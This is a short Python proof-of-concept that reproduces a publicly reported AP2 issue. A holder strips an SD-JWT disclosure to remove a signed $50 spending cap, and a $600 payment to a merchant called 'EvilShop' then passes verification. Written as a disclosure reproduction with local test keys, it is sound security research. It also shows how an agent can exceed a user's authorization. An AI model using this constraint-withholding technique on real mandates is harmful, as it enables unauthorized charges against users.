"""A selectively-disclosable constraint can be withheld to disable enforcement.

SD-JWT lets the holder drop individual disclosures without breaking the issuer
signature. AP2 evaluates only the constraints that are present, so a holder who
omits a constraint's disclosure silently removes that limit. The user signs a
$50 cap; the agent presents the mandate without it and settles $600.

Not a new vulnerability: reported in issue #339 and closed by Google's OSS VRP
as intended behavior. This reproduces it end to end.

Refs:
  https://github.com/google-agentic-commerce/AP2/issues/339
  https://datatracker.ietf.org/doc/rfc9901/
"""

import base64
import json

from ap2.sdk.disclosure_metadata import DisclosureMetadata
from ap2.sdk.generated.open_payment_mandate import AmountRange, OpenPaymentMandate
from ap2.sdk.generated.payment_mandate import PaymentMandate
from ap2.sdk.generated.types.amount import Amount
from ap2.sdk.generated.types.merchant import Merchant
from ap2.sdk.generated.types.payment_instrument import PaymentInstrument
from ap2.sdk.mandate import MandateClient
from ap2.sdk.payment_mandate_chain import PaymentMandateChain
from ap2.sdk.sdjwt import sd_jwt
from ap2.tests.conftest import make_cnf
from jwcrypto.jwk import JWK


def b64d(segment: str) -> bytes:
    return base64.urlsafe_b64decode(segment + "=" * (-len(segment) % 4))


def violations_for(open_token: str, issuer_pub: JWK, payment: PaymentMandate) -> list[str]:
    resolved = sd_jwt.verify(open_token, issuer_pub)
    body = next(part for part in resolved["delegate_payload"] if isinstance(part, dict))
    open_mandate = OpenPaymentMandate.model_validate(body)
    return PaymentMandateChain(open_mandate=open_mandate, closed_mandate=payment).verify()


def main() -> None:
    client = MandateClient()
    issuer = JWK.generate(kty="EC", crv="P-256")
    holder = JWK.generate(kty="EC", crv="P-256")
    issuer_pub = JWK.from_json(issuer.export_public())

    authorized = OpenPaymentMandate(constraints=[AmountRange(min=0, max=5000, currency="USD")], cnf=make_cnf(holder))
    sd = DisclosureMetadata(children={"constraints": DisclosureMetadata(sd_array_indices=[0])})
    open_token = client.create(payloads=[authorized], issuer_key=issuer, sd=sd)

    payment = PaymentMandate(
        transaction_id="tx",
        payee=Merchant(name="EvilShop", id="evil"),
        payment_amount=Amount(amount=60000, currency="USD"),
        payment_instrument=PaymentInstrument(id="pi", type="credit"),
    )

    honest = violations_for(open_token, issuer_pub, payment)
    print(f"full presentation -> {'BLOCKED' if honest else 'ALLOWED'} {honest}")

    prefix, _, disclosures = open_token.partition("~")
    kept = [d for d in disclosures.split("~") if d.strip() and "payment.amount_range" not in str(json.loads(b64d(d)))]
    stripped = prefix + "~" + "~".join(kept) + "~"

    withheld = violations_for(stripped, issuer_pub, payment)
    print(f"constraint withheld -> {'BLOCKED' if withheld else 'ALLOWED'} {withheld}")

    assert honest, "the $50 cap should block $600 when present"
    assert not withheld, "withholding the disclosure should erase the cap"


if __name__ == "__main__":
    main()
